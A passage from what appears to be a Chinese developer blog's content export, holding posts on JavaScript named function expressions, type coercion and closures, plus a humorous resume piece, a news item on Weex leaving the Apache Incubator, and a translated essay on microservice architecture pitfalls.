 </p>
<h5 id="7-4-代码改动是否兼容老版"><a href="#7-4-代码改动是否兼容老版" class="headerlink" title="7.4. 代码改动是否兼容老版"></a>7.4. 代码改动是否兼容老版</h5><p>XXXX。。。
 </p>
<h5 id="7-5-路由修改删除是否已检查页面投放情况"><a href="#7-5-路由修改删除是否已检查页面投放情况" class="headerlink" title="7.5. 路由修改删除是否已检查页面投放情况"></a>7.5. 路由修改删除是否已检查页面投放情况</h5><p>XXXX。。。
 </p>
<h5 id="7-6-其它风险说明"><a href="#7-6-其它风险说明" class="headerlink" title="7.6. 其它风险说明"></a>7.6. 其它风险说明</h5><p>XXXX。。。
 </p>
<h2 id="8-各节点里程碑"><a href="#8-各节点里程碑" class="headerlink" title="8. 各节点里程碑"></a>8. 各节点里程碑</h2><p>【列出各领域的关键事项及时间节点，以便各领域协同、项目透明、进度可预知】<br>XXXX。。。
 </p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>理解JavaScript内联命名函数</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E7%90%86%E8%A7%A3JavaScript%E5%86%85%E8%81%94%E5%91%BD%E5%90%8D%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>在使用JavaScript递归调用时，我们往往会在函数内部调用函数自身(通过函数名)，但是当我们改变了定义时所用函数名的指向时，那么这个递归函数指针关联的递归函数也将随之失效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var factorial &#x3D; function (num) &#123;</span><br><span class="line">    if (num &lt;&#x3D; 1) &#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num * factorial(num - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(factorial(5)); &#x2F;&#x2F; 120;</span><br><span class="line">var anothorFactorial &#x3D; factorial;</span><br><span class="line">factorial &#x3D; null;</span><br><span class="line">console.log(anothorFactorial(5)); &#x2F;&#x2F; Uncaught TypeError: factorial is not a function</span><br></pre></td></tr></table></figure>
<p>在非严格模式下我们可以使用 num * arguments.callee(num - 1)来代替函数名。<br>严格模式下，通常会采用内联命名函数来解决这个问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var factorial &#x3D; (function f(num) &#123;</span><br><span class="line">    if (num &lt;&#x3D; 1) &#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num*f(num - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(factorial(5)); &#x2F;&#x2F; 120</span><br><span class="line">var anothorFactorial &#x3D; factorial;</span><br><span class="line">factorial &#x3D; null;</span><br><span class="line">console.log(anothorFactorial(5)); &#x2F;&#x2F; 120</span><br></pre></td></tr></table></figure>

<p>这种方式的函数调用区别于下面这种方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> function f(num) &#123;</span><br><span class="line">    if (num &lt;&#x3D; 1) &#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num*f(num - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var factorial &#x3D; f;</span><br><span class="line">var anothorFactorial &#x3D; factorial;</span><br><span class="line">factorial &#x3D; null;</span><br><span class="line">console.log(anothorFactorial(5)); &#x2F;&#x2F; 120</span><br><span class="line">f &#x3D; null;</span><br><span class="line">console.log(anothorFactorial(5)); &#x2F;&#x2F; Uncaught TypeError: f is not a function</span><br></pre></td></tr></table></figure>

<p>给函数表达式的匿名函数命名并不会改变表达式的性质，即不会让它变成一个函数声明</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var factorial &#x3D; function f() &#123;</span><br><span class="line">    console.log(factorial &#x3D;&#x3D; f); &#x2F;&#x2F; true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(); &#x2F;&#x2F;true</span><br><span class="line">console.log(typeof f); &#x2F;&#x2F; undefined</span><br><span class="line">f(); &#x2F;&#x2F; Uncaught ReferenceError: f is not defined</span><br></pre></td></tr></table></figure>

<p>上述代码证明:尽管我们可以给内联函数命名，但是这些名称只能在自身函数内部才是可见的。使用内联方式调用，其本质和函数表达式没有太大不同，唯一的区别就是内联命名函数在函数内部提供了一个仅仅可供自身调用的函数指针，该指针指向函数自身。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>程序员如何在简历上写“我换了一个灯泡”？</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%A6%82%E4%BD%95%E5%9C%A8%E7%AE%80%E5%8E%86%E4%B8%8A%E5%86%99%E2%80%9C%E6%88%91%E6%8D%A2%E4%BA%86%E4%B8%80%E4%B8%AA%E7%81%AF%E6%B3%A1%E2%80%9D%EF%BC%9F/</url>
    <content><![CDATA[<p>每个人都会有这样的问题：<code>为什么看上去差不多的技术和资历，有人可以一个月收到二三十个offer，有人只有寥寥几个？</code><br>        答案与简历相关。<br>虽然技术有高有低、资历有深有浅，个人客观情况在短时间无法改变（经历造假可鄙），但是，如何将它们呈现在简历中是有技巧的。<br>比如：如果要在简历上写<code>“我换了一个灯泡”,</code>大家会怎么写?<br><strong>@字节跳动员工：</strong>在没有造成任何成本超支以及安全事故的情况下,独立成功管理了环境照明系统的升级与安装<br><strong>@阿里员工：</strong>我联合了硬件排查部门、采购部门、电力工程部门等等,结合这些资源,我顺利的找到了问题所在。最后推动各个部门协同工作,在大家共同努力之下最后成功和囻满的解决了问题。最后,我总结了一套流程,打造了一个x系统,用于自动检测类似问题。 一旦发现问题,系统将自动下发指令给正确的业务部分,自动完成整个工程,解决问题。大大的节省了資源以前需要100个人才能解决的问题,现在只需要10个人即可完成失去光明的时间,由以前的一个月,缩短到了1小时,在线时间达到9999999%。<br>**@网易员工:**我觉得这个难点在于理解整个电力系统架构,准确找到开关,并在尽可能减少业务损失情况下更换受损业务子模块。顺便我觉得可以优化成热更流程,在不关开关情况下换,但要非常小心,操作要干净快速。<br>**@百度员工;**为保障大家工作的顺利进行,我克服艰难亲自为大家换了办公室灯泡<br>**@京东员工:**负责办公室照明系统<br>**@苏宁员工:**重现光明。<br>**@移动员工:**后面紧着造成的后果,业绩、成绩、亮点,以及过程中的困难<br>**@腾讯员工:**我参与了公司的《爱是一道光》项目,前期独立完成整体架构搭建，后期与团队共同分享胜利的喜悦。<br><strong>@后厂村程序员</strong></p>
<ul>
<li>1.讲解电灯发明的历史理论基础</li>
<li> 2.讲解电灯的分类以及优缺点选型 </li>
<li>3.讲解之前灯的缺点替换的必要性 </li>
<li>4.讲解如何在不断电并且不灭灯的情况下换灯无损切换 </li>
<li>5.讲解换灯后的优点收益 </li>
<li>6.讲解如何将这套方法推广到各个系统方法论 </li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>类型转换</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<p>JavaScript 是<em>弱类型</em>语言，所以会在<strong>任何</strong>可能的情况下应用<em>强制类型转换</em>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 下面的比较结果是：true</span><br><span class="line">new Number(10) &#x3D;&#x3D; 10; &#x2F;&#x2F; Number.toString() 返回的字符串被再次转换为数字</span><br><span class="line"></span><br><span class="line">10 &#x3D;&#x3D; &#39;10&#39;;           &#x2F;&#x2F; 字符串被转换为数字</span><br><span class="line">10 &#x3D;&#x3D; &#39;+10 &#39;;         &#x2F;&#x2F; 同上</span><br><span class="line">10 &#x3D;&#x3D; &#39;010&#39;;          &#x2F;&#x2F; 同上 </span><br><span class="line">isNaN(null) &#x3D;&#x3D; false; &#x2F;&#x2F; null 被转换为数字 0</span><br><span class="line">                      &#x2F;&#x2F; 0 当然不是一个 NaN（译者注：否定之否定）</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 下面的比较结果是：false</span><br><span class="line">10 &#x3D;&#x3D; 010;</span><br><span class="line">10 &#x3D;&#x3D; &#39;-10&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ES5 提示:</strong> 以 <code>0</code> 开头的数字字面值会被作为八进制数字解析。 而在 ECMAScript 5 严格模式下，这个特性被<strong>移除</strong>了。</p>
<p>为了避免上面复杂的强制类型转换，<strong>强烈</strong>推荐使用<code>严格的等于操作符</code>。 虽然这可以避免大部分的问题，但 JavaScript 的弱类型系统仍然会导致一些其它问题。</p>
<h3 id="内置类型的构造函数"><a href="#内置类型的构造函数" class="headerlink" title="内置类型的构造函数"></a>内置类型的构造函数</h3><p>内置类型（比如 <code>Number</code> 和 <code>String</code>）的构造函数在被调用时，使用或者不使用 <code>new</code> 的结果完全不同。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Number(10) &#x3D;&#x3D;&#x3D; 10;     &#x2F;&#x2F; False, 对象与数字的比较</span><br><span class="line">Number(10) &#x3D;&#x3D;&#x3D; 10;         &#x2F;&#x2F; True, 数字与数字的比较</span><br><span class="line">new Number(10) + 0 &#x3D;&#x3D;&#x3D; 10; &#x2F;&#x2F; True, 由于隐式的类型转换</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用内置类型 <code>Number</code> 作为构造函数将会创建一个新的 <code>Number</code> 对象， 而在不使用 <code>new</code> 关键字的 <code>Number</code> 函数更像是一个数字转换器。</p>
<p>另外，在比较中引入对象的字面值将会导致更加复杂的强制类型转换。</p>
<p>最好的选择是把要比较的值<strong>显式</strong>的转换为三种可能的类型之一。</p>
<h3 id="转换为字符串"><a href="#转换为字符串" class="headerlink" title="转换为字符串"></a>转换为字符串</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39; + 10 &#x3D;&#x3D;&#x3D; &#39;10&#39;; &#x2F;&#x2F; true</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将一个值加上空字符串可以轻松转换为字符串类型。</p>
<h3 id="转换为数字"><a href="#转换为数字" class="headerlink" title="转换为数字"></a>转换为数字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+&#39;10&#39; &#x3D;&#x3D;&#x3D; 10; &#x2F;&#x2F; true</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用<strong>一元</strong>的加号操作符，可以把字符串转换为数字。</p>
<p>字符串转换为数字的常用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+&#39;010&#39; &#x3D;&#x3D;&#x3D; 10</span><br><span class="line">Number(&#39;010&#39;) &#x3D;&#x3D;&#x3D; 10</span><br><span class="line">parseInt(&#39;010&#39;, 10) &#x3D;&#x3D;&#x3D; 10  &#x2F;&#x2F; 用来转换为整数</span><br><span class="line"></span><br><span class="line">+&#39;010.2&#39; &#x3D;&#x3D;&#x3D; 10.2</span><br><span class="line">Number(&#39;010.2&#39;) &#x3D;&#x3D;&#x3D; 10.2</span><br><span class="line">parseInt(&#39;010.2&#39;, 10) &#x3D;&#x3D;&#x3D; 10</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="转换为布尔型"><a href="#转换为布尔型" class="headerlink" title="转换为布尔型"></a>转换为布尔型</h3><p>通过使用 <strong>否</strong> 操作符两次，可以把一个值转换为布尔型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!!&#39;foo&#39;;   &#x2F;&#x2F; true</span><br><span class="line">!!&#39;&#39;;      &#x2F;&#x2F; false</span><br><span class="line">!!&#39;0&#39;;     &#x2F;&#x2F; true</span><br><span class="line">!!&#39;1&#39;;     &#x2F;&#x2F; true</span><br><span class="line">!!&#39;-1&#39;     &#x2F;&#x2F; true</span><br><span class="line">!!&#123;&#125;;      &#x2F;&#x2F; true</span><br><span class="line">!!true;    &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>闭包和引用</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E9%97%AD%E5%8C%85%E5%92%8C%E5%BC%95%E7%94%A8/</url>
    <content><![CDATA[<p>闭包是 JavaScript 一个非常重要的特性，这意味着当前作用域<strong>总是</strong>能够访问外部作用域中的变量。 因为 `函 是 JavaScript 中唯一拥有自身作用域的结构，因此闭包的创建依赖于函数。</p>
<h3 id="模拟私有变量"><a href="#模拟私有变量" class="headerlink" title="模拟私有变量"></a>模拟私有变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Counter(start) &#123;</span><br><span class="line">    var count &#x3D; start;</span><br><span class="line">    return &#123;</span><br><span class="line">        increment: function() &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        get: function() &#123;</span><br><span class="line">            return count;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var foo &#x3D; Counter(4);</span><br><span class="line">foo.increment();</span><br><span class="line">foo.get(); &#x2F;&#x2F; 5</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里，<code>Counter</code> 函数返回两个闭包，函数 <code>increment</code> 和函数 <code>get</code>。 这两个函数都维持着 对外部作用域 <code>Counter</code> 的引用，因此总可以访问此作用域内定义的变量 <code>count</code>.</p>
<h3 id="为什么不可以在外部访问私有变量"><a href="#为什么不可以在外部访问私有变量" class="headerlink" title="为什么不可以在外部访问私有变量"></a>为什么不可以在外部访问私有变量</h3><p>因为 JavaScript 中不可以对作用域进行引用或赋值，因此没有办法在外部访问 <code>count</code> 变量。 唯一的途径就是通过那两个闭包。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; new Counter(4);</span><br><span class="line">foo.hack &#x3D; function() &#123;</span><br><span class="line">    count &#x3D; 1337;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码<strong>不会</strong>改变定义在 <code>Counter</code> 作用域中的 <code>count</code> 变量的值，因为 <code>foo.hack</code> 没有 定义在那个<strong>作用域</strong>内。它将会创建或者覆盖<em>全局</em>变量 <code>count</code>。</p>
<h3 id="循环中的闭包"><a href="#循环中的闭包" class="headerlink" title="循环中的闭包"></a>循环中的闭包</h3><p>一个常见的错误出现在循环中使用闭包，假设我们需要在每次循环中调用循环序号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">    setTimeout(function() &#123;</span><br><span class="line">        console.log(i);  </span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码不会输出数字 <code>0</code> 到 <code>9</code>，而是会输出数字 <code>10</code> 十次。</p>
<p>当 <code>console.log</code> 被调用的时候，<em>匿名</em>函数保持对外部变量 <code>i</code> 的引用，此时 <code>for</code>循环已经结束， <code>i</code> 的值被修改成了 <code>10</code>.</p>
<p>为了得到想要的结果，需要在每次循环中创建变量 <code>i</code> 的<strong>拷贝</strong>。</p>
<h3 id="避免引用错误"><a href="#避免引用错误" class="headerlink" title="避免引用错误"></a>避免引用错误</h3><p>为了正确的获得循环序号，最好使用 匿名包装器`其实就是我们通常说的自执行匿名函数）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">    (function(e) &#123;</span><br><span class="line">        setTimeout(function() &#123;</span><br><span class="line">            console.log(e);  </span><br><span class="line">        &#125;, 1000);</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>外部的匿名函数会立即执行，并把 <code>i</code> 作为它的参数，此时函数内 <code>e</code> 变量就拥有了 <code>i</code> 的一个拷贝。</p>
<p>当传递给 <code>setTimeout</code> 的匿名函数执行时，它就拥有了对 <code>e</code> 的引用，而这个值是<strong>不会</strong>被循环改变的。</p>
<p>有另一个方法完成同样的工作，那就是从匿名包装器中返回一个函数。这和上面的代码效果一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">    setTimeout((function(e) &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">            console.log(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)(i), 1000)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>阿里巴巴主导的 Weex 因活跃度不够从 Apache Incubator 退休</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B8%BB%E5%AF%BC%E7%9A%84Weex%E5%9B%A0%E6%B4%BB%E8%B7%83%E5%BA%A6%E4%B8%8D%E5%A4%9F%E4%BB%8EApacheIncubator%E9%80%80%E4%BC%91/</url>
    <content><![CDATA[<p><a href="https://www.oschina.net/action/GoToLink?url=https://lists.apache.org/thread.html/reb2523a568b5ce5cfc1b8017c20106221f0ab689ebcf3cb42feb8a54%2540%253Cgeneral.incubator.apache.org%253E">根据 Apache Incubator 邮件列表的信息</a>，上周发起的关于 Weex 是否从 Apache Incubator 退休的投票已结束。投票结果显示，由于没有[-1]否决票，所以 Weex 从 Apache Incubator 退休的投票获得了 IPMC 的一致通过。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-af70e8e94120a0b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>Weex 从 Apache Incubator 退休并不意味着停止维护，仅表示它不再在 Apache Incubator 中开发（与 TLP 项目移动至 <a href="https://www.oschina.net/news/112808/apache-moved-to-the-attic">Attic</a> 类似），详情查看 <a href="https://www.oschina.net/action/GoToLink?url=https://incubator.apache.org/guides/retirement.html">Guide to Retirement</a>。</p>
<p>此外，从之前邮件列表中的<a href="https://www.oschina.net/action/GoToLink?url=https://lists.apache.org/thread.html/rcaf67836a77ad3bebcafffc9e853bcd043a844e123e06ac8e71c9f4d%2540%253Cdev.weex.apache.org%253E">讨论</a>可以看到，Weex 在阿里巴巴（尤其是淘宝）中仍被广泛使用，许多开发者仍在开发 Weex，并有长期计划来对其进行改进。所以 Weex 从 Apache Incubator 退休后也会继续开发。</p>
<p>此次投票的发起人，同时也是 Weex 项目的导师姜宁 (<a href="https://my.oschina.net/u/3569919">@WillemJiang</a>) <a href="https://www.oschina.net/action/GoToLink?url=https://www.zhihu.com/question/459369570/answer/1886114582">表示</a>，Weex 从 Apache Incubator 退休的主要原因是项目活跃度不够。这里的活跃度指的是 Weex 在 Apache 社区中的活跃情况，姜宁提到 Weex 的很多 PPMC 成员都不活跃，例如没有提交 IPMC Chair 需要的社区报告。不活跃的氛围导致项目发布新版本时也没有足够的人来进行投票（官网和 GitHub 上显示的最新版本是2019年发布的 <a href="https://www.oschina.net/action/GoToLink?url=https://github.com/apache/incubator-weex/releases/tag/0.28.0">0.28</a>）。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-eac2fdc67fb7bf4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>根据 ASF 董事吴晟 (<a href="https://my.oschina.net/wusheng">@wu-sheng</a>) 的<a href="https://www.oschina.net/action/GoToLink?url=https://twitter.com/wusheng1108/status/1393011558289051651">说法</a>，Weex 似乎也是中国首个从 Apache Incubator 退休的项目。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7e4ed45f7d5166fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><a href="https://www.oschina.net/action/GoToLink?url=https://weex.apache.org/zh/">Weex</a> 于2016年<a href="https://www.oschina.net/news/72703/weex-web-native">正式开源</a>，定位是使用 Web 来开发高性能原生应用的框架。Weex 致力于使开发者能基于通用跨平台的 Web 开发语言和开发经验，来构建 Android、iOS 和 Web 应用。简单来说，在集成 WeexSDK 之后，开发者可以使用 JavaScript 语言和前端开发经验来开发移动应用。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-43dc96bc94d25aba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>现在再回去看 Vue.js 作者尤雨溪当时对 Weex 的<a href="https://www.oschina.net/action/GoToLink?url=https://www.zhihu.com/question/37636296/answer/72881168">评价</a>，似乎一切早已注定……</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-01a451e251c17421.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>**PS:**16年团队在做多端时，在选择weex还是react-native，考虑了很多，最终选择了，react-native作为主要研究方向，现在回顾下，有庆幸，有惋惜。希望以后国内的开源项目越来越好！</p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>我曾目睹的微服务灾难</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E6%88%91%E6%9B%BE%E7%9B%AE%E7%9D%B9%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%81%BE%E9%9A%BE/</url>
    <content><![CDATA[<p>2014 年 Martin Fowler 发表了一篇关于微服务的文章，当时，我所在的团队正在构建面向服务的架构。这篇文章以及随后的炒作几乎影响了世界上所有的软件团队。那时，“Netflix OSS 栈”是世界上最酷的东西，它可以让世界各地的工程师在分布式系统中使用 Netflix 的经验。六年多过去了，如果我们现在来看看软件工程的工作，就会发现，其中大部分都是关于微服务的架构的。</p>
<p>炒作驱动开发</p>
<p>在 2010 年代的早期，很多组织都面临着软件开发周期的挑战。与其他 50、100 或 200 名工程师一起工作的人，他们在开发环境、QA 过程和程序部署方面都很困难。Martin Fowler 的《Continuous Delivery》（译注：尚无中译本）一书给许多团队带来了曙光，他们开始意识到，他们那“雄伟”的单体应用正给他们带来组织问题。所以，微服务对软件工程师很有吸引力。在一个大项目中引入持续交付或部署，而不是一开始就引入，更具有挑战性。</p>
<p>于是，团队开始拆分三个、十个、一百个微服务。其中大部分都使用“JSON over HTTP”（其他人可能会称之为 RESTful）API 来在这些组件之间实现远程调用。人们对 HTTP 协议非常熟悉，这看起来是一种将单体应用转换成小程序块的简单方法。这时，团队在 15 分钟之内就开始将代码部署到生产环境中。再也没有“哦，团队 A 破坏了 CI 管道，我不能部署我的代码”这样的情况了，这种感觉棒极了！</p>
<p>但是，大多数工程师都忘了，在解决软件架构层面的组织问题的同时，他们也引入了许多复杂性。分布式系统的谬误变得越来越明显，并很快让这些团队感到头疼。甚至那些已经在做客户机 / 服务器架构的公司，当他们的系统中有超过 10 个移动部分时，也会出现这种情况。</p>
<p>现实的反击</p>
<p>做出重大的架构改变并非没有成本。团队开始认识到，共享数据库是一种单点故障。后来他们意识到，他们各自的领域创造了一个全新的世界：最终的一致性就是一件事。在你提取数据的服务失败后该怎么办？很多问题开始堆积如山。高速开发速度的承诺被寻找错误、事件和数据一致性问题等压得喘不过气。另外一个问题是，工程师需要一种集中的日志和可观察性解决方案，在几十个服务中发现并纠正这些缺陷。</p>
<p>灾难 1：服务规模过小</p>
<p>随着开发人员创造力的爆发，每天都能创造出新的服务。一项新功能？咣当，让我们开始服务吧！突然之间，20 名工程师组成了维护 50 项服务的小组。一人负责一项服务还不够！一般而言，代码的问题在于它会“腐烂”。维护每一项服务都是要付出代价的。想象一下，在你的服务团队中传播一个库的升级。再想象一下，这些服务开始于不同的时间点，具有不同的架构、业务逻辑和所使用的框架之间的纠葛。那是多么可怕啊！解决这些问题的方法当然是有的。其中大部分都不能使用，而其他一些则需要花费很多 FTE 工作。</p>
<p>另外一种感觉是，我被告知，在服务 A 中部署新功能，并且在服务 B 中同时部署，或者当人们开始编写服务以生成 CSV 时。为什么会有人引入网络跳转，以产生世界上已知的文件格式？这东西谁来维护？有些团队正在受服务之苦。更糟的是，它在开发过程中会产生许多摩擦。与仅仅在 IDE 中查看一个项目不同，人们需要一次打开多个项目才能了解所有这些混乱的情况。</p>
<p>灾难 2：开发环境</p>
<p>我已经记不清有多少次有人走近我说：</p>
<p>“嘿，João。你有时间吗？我们需要改善开发环境了！大家都在抱怨这些事，可是都没用！”</p>
<p>这一问题涉及各个层面。移动开发者不需要在开发环境中开发功能就可以实现，或者后端开发者想要尝试他们的服务而不会破坏任何业务流程。如果有人想在生产之前在移动应用中测试整个过程，这也是一个问题。</p>
<p>跨分布式系统的开发环境存在一些问题，尤其是规模方面：</p>
<p>在云供应商中启动 200 个服务需要花费多少钱？你能做到吗？你是否能够启动运行他们所需的基础设施呢？</p>
<p>这需要多长时间呢？加入一个移动工程师开始开发一项功能，在给定的版本中有一组服务，当这些服务完成之后，有 10 个新版本被部署到生产中，那会怎样？</p>
<p>测试数据怎么样？你是否拥有所有服务的测试数据？在整个 Fleet 中都保持一致，所以用户和其他实体相匹配？</p>
<p>当你开发一个多租户、多区域的应用时，如何配置和功能标志？怎样跟上生产进度？若同时更改缺省值呢？</p>
<p>这些只是冰山一角而已。你可能会考虑将工程技术应用于这个问题。那也许行得通。但是，我怀疑大多数组织是否有足够大的规模来完成这项工作。这样做既麻烦又费钱。</p>
<p>灾难 3：端到端测试</p>
<p>不难想象，端到端测试和开发环境有相似的问题。在此之前，使用虚拟机或容器创建新的开发环境相对简单。同样，使用 Selenium 创建测试套件非常简单，它可以在部署新版本之前通过业务流并判断它们是否在工作。有了微服务，即使我们能够解决以上关于构建环境的所有问题，我们也不能再次宣布系统正在运行。我们至多可以这样说，运行特定版本的服务和特定配置的系统可以在特定的时间点上正常工作。真是大不相同啊！</p>
<p>要让人们相信我们只能进行几次这样的测试是非常困难的。而且在持续集成（Continuous Integration）流程中运行这些测试并不够。它们应该持续运行。它们应该针对生产运行情况发出相应的警报。我已经分享了无数次 Cindy Sridharan 的文章《在生产中测试，安全的方法》（Testing in production, the safe way），试图让人们理解我的观点。</p>
<p>灾难 4：巨大的共享数据库</p>
<p>一种简单的方法就是继续使用共享数据库，这样就可以避免单体应用，同时保证数据的一致性。这种方法不会增加操作负荷，而且可以轻松地一步一步地切割单体应用。但它也有相当大的缺点。这不仅是一个明显的单点故障，而且违背了面向服务架构的一些原则。你是否为每项服务创建一个用户？你是否具有细粒度的权限，以便服务 A 只能读写特定的表？假如某人不小心删除了索引怎么办？怎样知道有多少服务使用了不同的表？那扩容呢？</p>
<p>解决这些问题本身就变成了一个全新的难题。在技术上，这可能不是一个无关紧要的小问题，因为数据库经常比软件寿命长。用数据复制来解决问题——不管是 Kafaka、AWS DMS 还是其他什么——都需要你的工程团队理解数据库的细节，以及如何处理重复时间等等。</p>
<p>灾难 5：API 网关</p>
<p>在面向服务的架构中，API 网关是一种典型模式。它们帮助解耦后端与前端消费者。在实施端点聚合、速率限制或跨系统认证方面，它们也有用。近来，业界倾向于 backend-for-frontend（BFF，服务于前端的后端）的架构，将网关部署到前端的每个消费者群体（iOS、Android、Web 或桌面应用），从而解耦它们的进化。</p>
<p>和世界上的任何东西一样，人们开始有了新的创造性用例。有时这只是一个小技巧，使移动应用能够向后兼容。突然间，你的 API 网关变成了一个单点故障，因为人们发现在一个地方进行认证更加容易，其中还包含一些出乎意料的业务逻辑。现在，你不再有一个获得所有流量的单体应用，而是有一个自己开发的 Spring Boot 服务来或许所有的流量！会出什么问题呢？工程人员很快意识到这是个错误，但是由于存在大量的定制，有时候他们不能用它来取代无状态的、可扩展的定制。</p>
<p>当使用未分页的端点或返回大量响应时，就会导致 API 网关灾难。又或者，如果你在没有后备机制的情况下进行聚合，仅仅调用一次 API 就会“烧毁”你的网关。</p>
<p>灾难 6：超时、重试和弹性</p>
<p>分布式系统经常处于局部故障模式。如果服务 A 不能与服务 B 取得联系，会发生什么？咱们可以再试一次，对吗？但是这很快让我们陷入了困惑之中。我见过有些团队使用断路器，然后对下游服务进行 HTTP 调用时会超时。尽管这可能是一种正常的反应，为我们争取了一些时间来解决问题，但是它会产生二阶效应。所有这些请求都将被断路器取消，因为它们太长，在断路器上的时间太长。随着流量的增加，会有越来越多的请求进入队列，结果会比你希望修复的更糟。工程师们都在努力理解队列理论，理解为什么会出现超时现象。同样的事情发生在团队开始讨论 HTTP 客户端的线程池等问题时。尽管对这些东西进行配置本身就是一种艺术，但基于直觉来设置数值会使你陷入严重的停机状态。</p>
<p>在从失败中恢复的过程中，一个棘手的问题是并非所有的失败都一样。有些情况下，我们会希望我们的消费者是等幂的。但是这意味着我们应该积极的决定每一种失败情况下该怎么做。消费者是否等幂？能否重试这个调用？在认识到存在巨大的数据完整性问题之前，我已经看到许多工程师忽视了这些，因为它们只是“边缘情况”。</p>
<p>即使你设置了后备机制，重试也比所有这些更加复杂。假设你的移动应用有 500 万用户，而更新用户首选项的消息总线暂时无法运行。你创建了一个支持这种情况的后备机制，该机制通过 HTTP API 调用用户的首选项服务。你应该知道我在说什么吧。如今，该服务突然出现了巨大的流量尖峰，可能无法应付所有的流量。更糟糕的是：你的服务可能接收到所有这些新请求，但是如果重试机制不能实现指数退避和抖动，那么你就可能遇到来自移动应用的分布式拒绝服务。</p>
<p>看到所有这些灾难，你还喜欢分布式系统吗？</p>
<p>要是我告诉你，我只是写下了我所看到的灾难中的一小部分呢？分布式系统很难掌握，而且大多数软件工程师只是在最近才持续接触到它们。</p>
<p>好消息是，对于我所说的很多灾难，我们都能找到解决方案，行业已经创造除了更好的工具，使得除了美国五大科技巨头（Facebook、苹果、亚马逊、Netflix、谷歌）之外的其他组织都能解决这些问题。</p>
